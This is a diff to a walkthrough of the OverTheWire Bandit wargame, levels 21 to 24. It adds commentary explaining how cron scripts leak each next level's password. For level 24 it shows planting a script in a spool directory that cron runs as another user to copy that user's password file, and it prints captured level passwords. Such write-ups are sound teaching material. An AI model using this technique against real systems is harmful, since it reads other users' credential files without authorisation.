@@ -661,7 +661,7 @@ Password matches, sending next password
 
 #### Level 21 > Level 22
 
-> 
+> We are told to check to see what cron jobs are running at regular intervals on the server. So we check `/etc/cron.d/`. We see there is a program running called `cronjob_bandit22`. We check it out in the `/usr/bin/` directory and see the following shell code….
 
 ```bash
 bandit21@bandit:~$ cd /etc/cron.d/
@@ -677,14 +677,19 @@ bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
 @reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
 * * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
 bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
-#!/bin/bash
-chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
-cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+  #!/bin/bash
+  chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+  cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+
+# This program stores the password in a self created directory. We can copy the location.
+
 bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
 ```
 
 #### Level 22 > Level 23
+
+> Similar problem to before, so we must naviagate to the `/etc/cron.d` directory and see what is running. We find a program running called `cronjob_bandit23`.
 
 ```bash
 bandit22@bandit:~$ cd /etc/cron.d
@@ -700,14 +705,19 @@ bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
 @reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
 * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
 bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
-#!/bin/bash
+  #!/bin/bash
 
-myname=$(whoami)
-mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+  myname=$(whoami)
+  mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
 
-echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+  echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
 
-cat /etc/bandit_pass/$myname > /tmp/$mytarget
+  cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+# This creates a directory in /tmp named after an md5 hashing algorithm without spaces.
+# The algorithm is a combination of a string and a user.
+
+# Let's copy this md5 hashing algorithm and run it in the command line with user bandit23.
 
 bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
 8ca319486bfbbc3663ea0fbe81326349
@@ -716,6 +726,8 @@ jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 ```
 
 #### Level 23 > Level 24
+
+> On this level, we are informed that there is a cron script running and we need to enumerate /etc/cron.d/ for the password. So just as before, we navigate to the proper directory and read the `cronjob_bandit24.sh` file.
 
 ```bash
 bandit23@bandit:~$ cd /etc/cron.d
@@ -735,28 +747,41 @@ cat /etc/bandit_pass/bandit24 >> tmp/Ignite123/level24
 ~
 ~
 bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
-#!/bin/bash
+  #!/bin/bash
 
-myname=$(whoami)
+  myname=$(whoami)
 
-cd /var/spool/$myname
-echo "Executing and deleting all scripts in /var/spool/$myname:"
-for i in * .*;
-do
-    if [ "$i" != "." -a "$i" != ".." ];
-    then
-	echo "Handling $i"
-	timeout -s 9 60 ./$i
-	rm -f ./$i
-    fi
-done
+  cd /var/spool/$myname
+  echo "Executing and deleting all scripts in /var/spool/$myname:"
+  for i in * .*;
+  do
+      if [ "$i" != "." -a "$i" != ".." ];
+      then
+    echo "Handling $i"
+    timeout -s 9 60 ./$i
+    rm -f ./$i
+      fi
+  done
 
+# We see there is a variable named "myname" given the output of the whoami command.
+# We then change directory to /var/spool/$myname.
+# We then execute and delete all files within the directory.
+
+# In order to take advantage, we need to write a shell script and place it in /var/spool.
+# First let's make a working directory in /tmp with any name we want.
 
 bandit23@bandit:/etc/cron.d$ mkdir /tmp/Ignite123
 bandit23@bandit:/etc/cron.d$ cd /tmp/Ignite123
 bandit23@bandit:/tmp/Ignite123$ vi bandit24.sh
 	#!/bin/bash
 	cat /etc/bandit_pass/bandit24 >> /tmp/Ignite123/level24
+	
+# This script will cat the password for the next level into a file we made called "level24"
+# REMEMBER: Ignite123 and level24 are arbitrary... it doesn't matter what they are called.
+
+# Now let's give our shell script the proper permissions. (same with our directory)
+# We will also copy it to the /var/spool directory
+	
 bandit23@bandit:/tmp/Ignite123$ chmod 777 bandit24.sh
 bandit23@bandit:/tmp/Ignite123$ cp bandit24.sh /var/spool/bandit24/
 bandit23@bandit:/tmp/Ignite123$ chmod 777 /tmp/Ignite123
@@ -766,14 +791,14 @@ bandit23@bandit:/tmp/Ignite123$ cat level24
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 ```
 
+> We can also run the below  commands to obtain the password. Much faster and more elegant, but defeats the purpose of the challenge.
+
 ```bash
 echo I am user bandit24 | md5sum | cut -d ' ' -f 1
 cat /tmp/ee4ee1703b083edac9f8183e4ae70293
 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 ssh bandit24@localhost
 ```
-
-
 
 #### Level 24 > Level 25
 
